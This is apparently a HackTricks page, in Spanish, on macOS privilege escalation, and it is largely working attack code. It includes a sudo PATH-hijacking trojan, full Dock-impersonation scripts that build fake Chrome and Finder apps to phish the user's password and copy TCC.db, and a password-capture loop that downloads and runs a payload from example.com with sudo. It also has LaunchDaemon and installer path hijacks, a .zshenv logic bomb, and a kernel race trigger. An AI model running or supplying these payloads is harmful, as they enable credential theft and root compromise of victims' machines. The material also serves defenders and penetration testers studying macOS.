# Escalada de privilegios en macOS

{{#include ../../banners/hacktricks-training.md}}

## Escalada de privilegios de TCC

Si has llegado aquí buscando información sobre la escalada de privilegios de TCC, ve a:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Privesc en Linux

Muchas técnicas de escalada de privilegios que afectan a Linux u otros sistemas similares a Unix también se aplican a macOS. Consulta:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interacción del usuario

### Secuestro de Sudo

Puedes encontrar la técnica original de [secuestro de Sudo en la publicación sobre escalada de privilegios en Linux](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Sin embargo, macOS **mantiene** el **`PATH`** del usuario cuando este ejecuta **`sudo`**. Esto significa que otra forma de llevar a cabo este ataque sería **secuestrar otros binarios** que la víctima aún ejecuta al **usar sudo:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Ten en cuenta que es muy probable que un usuario que utiliza la terminal tenga **Homebrew instalado**. Por lo tanto, es posible secuestrar binarios en **`/opt/homebrew/bin`**.

### Dock Impersonation

Mediante **ingeniería social**, podrías **suplantar, por ejemplo, a Google Chrome** en el Dock y ejecutar tu propio script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Algunas sugerencias:

- Comprueba si hay un Chrome en el Dock y, si lo hay, **elimina** esa entrada y **añade** la entrada de **Chrome falso** en la misma posición de la matriz del Dock.

<details>
<summary>Script para suplantar a Chrome en el Dock</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Algunas sugerencias:

- **No puedes quitar Finder del Dock**, así que, si vas a añadirlo al Dock, puedes colocar el Finder falso junto al real. Para ello, debes **añadir la entrada del Finder falso al principio del array del Dock**.
- Otra opción es no colocarlo en el Dock y simplemente abrirlo; «Finder pide controlar Finder» no es tan raro.
- Otra opción para **escalar a root sin pedir** la contraseña y sin mostrar un cuadro horrible es hacer que Finder realmente pida la contraseña para realizar una acción privilegiada:
  - Pedir a Finder que copie un nuevo archivo **`sudo`** en **`/etc/pam.d`** (el mensaje que pide la contraseña indicará que «Finder quiere copiar sudo»).
  - Pedir a Finder que copie un nuevo **Authorization Plugin** (puedes controlar el nombre del archivo para que el mensaje que pide la contraseña indique que «Finder quiere copiar Finder.bundle»).

<details>
<summary>Script de suplantación del Dock de Finder</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Phishing mediante solicitud de contraseña + reutilización de sudo

El malware suele abusar de la interacción del usuario para **capturar una contraseña con permisos de sudo** y reutilizarla mediante programación. Un flujo habitual:

1. Identificar al usuario que inició sesión con `whoami`.
2. **Repetir las solicitudes de contraseña** hasta que `dscl . -authonly "$user" "$pw"` devuelva éxito.
3. Guardar en caché la credencial (p. ej., `/tmp/.pass`) y ejecutar acciones privilegiadas con `sudo -S` (contraseña por stdin).

Ejemplo de cadena mínima:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

La contraseña robada puede reutilizarse para **eliminar la cuarentena de Gatekeeper con `xattr -c`**, copiar LaunchDaemons u otros archivos privilegiados y ejecutar etapas adicionales de forma no interactiva.<sup>[[1]](#references)</sup>

#### Validar las contraseñas capturadas mediante PAM

Un prompt de texto seguro con apariencia nativa puede recopilar la contraseña de una cuenta candidata y validarla en el proceso mediante PAM, en lugar de iniciar `dscl`, `security` u `osascript`. El proceso que realiza la llamada inicia una transacción PAM con `pam_start`, proporciona la contraseña candidata mediante una callback de conversación, llama a `pam_authenticate` y cierra la transacción con `pam_end`. Si la comprobación falla, puede volver al campo de contraseña; si tiene éxito, confirma la contraseña sin iniciar un proceso de verificación aparte. La autenticación PAM por sí sola **no** eleva los privilegios del proceso ni autoriza operaciones privilegiadas.<sup>[[9]](#references)[[10]](#references)</sup>

Si las contraseñas de inicio de sesión y del Keychain coinciden, la contraseña capturada también podría servir para operaciones que requieren la contraseña actual del Keychain; consulta [Keychain ACL and partition-list constraints](../macos-red-teaming/macos-keychain.md).<sup>[[10]](#references)</sup>

## Vectores específicos de versiones recientes de macOS (2023–2026)

### `AuthorizationExecuteWithPrivileges` obsoleto sigue siendo utilizable

`AuthorizationExecuteWithPrivileges` quedó obsoleto en la versión 10.7, pero **sigue funcionando en Sonoma/Sequoia**. Muchos actualizadores comerciales invocan `/usr/libexec/security_authtrampoline` con una ruta que no es de confianza. Si el binario de destino permite escritura al usuario, puedes colocar un troyano y aprovechar el prompt legítimo:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Combínalo con los **trucos de masquerading anteriores** para mostrar un diálogo de contraseña convincente.


### Triage de helper privilegiado / XPC

Muchas privescs modernas de terceros en macOS siguen el mismo patrón: un **LaunchDaemon de root** expone un **servicio Mach/XPC** desde **`/Library/PrivilegedHelperTools`** y luego el helper no valida al cliente, lo valida **demasiado tarde** (condición de carrera con el PID) o expone un **método de root** que usa una ruta o un script controlado por el usuario. Esta es la clase de vulnerabilidad detrás de muchos fallos recientes en helpers de clientes VPN, lanzadores de juegos y actualizadores.<sup>[[2]](#references)</sup>

Lista rápida de verificación para el triage:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Presta especial atención a los helpers que:

- siguen aceptando solicitudes **después de la desinstalación** porque el job permaneció cargado en `launchd`
- ejecutan scripts o leen la configuración desde **`/Applications/...`** u otras rutas en las que pueden escribir usuarios sin privilegios de root
- dependen de una validación del peer basada en **PID** o solo en **bundle-id**, que puede estar sujeta a race conditions

Para más detalles sobre bugs de autorización de helpers, consulta [esta página](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Herencia del entorno de scripts de PackageKit (CVE-2024-27822)

Hasta que Apple corrigió el problema en **Sonoma 14.5**, **Ventura 13.6.7** y **Monterey 12.7.5**, las instalaciones iniciadas por el usuario mediante **`Installer.app`** / **`PackageKit.framework`** podían ejecutar scripts PKG como root dentro del entorno del usuario actual. Esto significa que un paquete que use **`#!/bin/zsh`** cargaría el **`~/.zshenv`** del atacante y lo ejecutaría como root cuando la víctima instalara el paquete.<sup>[[3]](#references)</sup>

Esto resulta especialmente interesante como **logic bomb**: solo necesitas un foothold en la cuenta del usuario y un archivo de inicio de shell en el que se pueda escribir; después, esperas a que el usuario ejecute cualquier instalador vulnerable basado en **zsh**. Por lo general, esto **no** se aplica a las implementaciones de **MDM/Munki**, porque se ejecutan dentro del entorno del usuario root.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Si quieres profundizar en el abuso específico de los instaladores, consulta también [esta página](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Colisión del destino del instalador mediante `.localized`

Algunos instaladores de terceros registran un LaunchDaemon de root cuyo ejecutable se referencia mediante una ruta fija dentro de `/Applications/Target.app`. Si un atacante puede crear primero ese bundle con un **identificador de bundle diferente**, Installer puede conservar el señuelo y colocar la aplicación real en `/Applications/Target.localized/Target.app`. El daemon sigue apuntando a la ruta original. Por lo tanto, un ejecutable controlado por el atacante dentro del bundle señuelo puede ejecutarse posteriormente como root.<sup>[[8]](#references)</sup>

Las condiciones previas importantes son:<sup>[[8]](#references)</sup>

1. El atacante puede crear o controlar la ruta de la aplicación esperada.
2. El paquete no elimina el bundle en conflicto.
3. El job privilegiado usa una ruta codificada dentro de ese bundle.
4. El usuario o un flujo de trabajo de MDM instala el paquete y registra el job.

Busca bundles reubicados y luego revisa los destinos de LaunchDaemon con el bucle de enumeración de la siguiente sección:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Un instalador más seguro resuelve la ubicación final del bundle y mantiene los ejecutables privilegiados en una ubicación propiedad de root, como `/Library/PrivilegedHelperTools`. También debe verificar la propiedad y la firma de código antes de registrar o iniciar el job.<sup>[[8]](#references)</sup>

### Hijack de un destino escribible de LaunchDaemon

Un plist de LaunchDaemon puede ser propiedad de root mientras que su `Program` o la primera entrada de `ProgramArguments` apunta a un directorio en el que el usuario puede escribir. Comprueba la **ruta completa**, no solo los permisos del ejecutable. Si se puede escribir en el directorio padre, un atacante puede cambiar el nombre de un ejecutable propiedad de root y crear un reemplazo en la misma ruta. El reemplazo se ejecuta como root la próxima vez que se inicia el job. Basta con reiniciar el sistema o reiniciar normalmente el servicio. El atacante no necesita permiso para ejecutar `launchctl bootstrap` en el dominio del sistema.<sup>[[7]](#references)</sup>

Enumera primero cada destino y su directorio padre inmediato:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Cuando el archivo o su directorio padre permita escritura, conserva el binario original y reemplaza la ruta por un payload ejecutable. Luego, espera a que se reinicie el daemon ya cargado.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### Carrera del puntero de credenciales en XNU SMR (CVE-2025-24118)

La ruta vulnerable `kauth_cred_proc_update` actualizaba `proc_ro.p_ucred` mediante la API no atómica `zalloc_ro_mut`, mientras los lectores de SMR cargaban el puntero sin bloqueo. El disparador público utiliza un binario setgid preparado especialmente. Un hilo alterna entre sus ID de grupo real y efectivo mientras otro entra repetidamente en una llamada al sistema como `getgid()`.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Trata esto como una **primitiva de carrera**, no como un exploit de root listo para usar. El PoC publicado demuestra un puntero de credenciales rasgado. Suele acabar en un kernel panic. El investigador solo reprodujo la corrupción en Intel y no proporcionó un control determinista del objeto de credenciales resultante. Apple cambió la actualización por un intercambio atómico de punteros en macOS 15.3.<sup>[[4]](#references)</sup>

### Bypass de SIP mediante Migration Assistant ("Migraine", CVE-2023-32369)

Si ya tienes root, SIP sigue bloqueando las escrituras en ubicaciones del sistema. El bug **Migraine** aprovecha el entitlement de Migration Assistant `com.apple.rootless.install.heritable` para iniciar un proceso hijo que hereda el bypass de SIP y sobrescribe rutas protegidas (por ejemplo, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> La cadena:

1. Obtén root en un sistema en funcionamiento.
2. Activa `systemmigrationd` con un estado manipulado para ejecutar un binario controlado por el atacante.
3. Usa el entitlement heredado para modificar archivos protegidos por SIP, manteniendo los cambios incluso tras reiniciar.

### Contrabando de expresiones NSPredicate/XPC (clase de bugs CVE-2023-23530/23531)

Varios daemons de Apple aceptan objetos **NSPredicate** a través de XPC y solo validan el campo `expressionType`, que puede controlar el atacante. Al crear un predicate que evalúe selectores arbitrarios, puedes lograr **ejecución de código en servicios XPC de root/sistema** (por ejemplo, `coreduetd`, `contextstored`). Si se combina con una evasión inicial del sandbox de una app, esto permite la **escalada de privilegios sin avisos al usuario**. Busca endpoints XPC que deserialicen predicates y no tengan un visitor robusto.<sup>[[6]](#references)</sup>

## TCC - Escalada de privilegios de root

### CVE-2020-9771 - Bypass de TCC y escalada de privilegios mediante mount_apfs

**Cualquier usuario** (incluso los que no tienen privilegios) puede crear y montar un snapshot de Time Machine con `-o noowners` y **acceder a TODOS los archivos** de ese snapshot, omitiendo las comprobaciones de propiedad del volumen activo. El único privilegio necesario es que la aplicación utilizada (como `Terminal`) tenga **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Los comandos y la explicación completa están en la página de bypasses de TCC:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Información sensible

Esto puede ser útil para escalar privilegios:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Pentest Partners - 2025, el año del infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: escalada local de privilegios en AWS Client VPN para macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: escalada de privilegios en macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine": bypass de SIP (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Una nueva clase de bugs de escalada de privilegios en macOS e iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Secuestro de LaunchDaemon: escalada de privilegios y persistencia mediante permisos inseguros en carpetas](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [LPE en macOS mediante el directorio .localized](https://theevilbit.github.io/posts/localized/)
- [9] [Jamf Threat Labs - PamStealer: malware para macOS que se hace pasar por una app de gestión del portapapeles](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
- [10] [Kaspersky Securelist - Análisis detallado de MacSync](https://securelist.com/macsync-new-version/121383/)
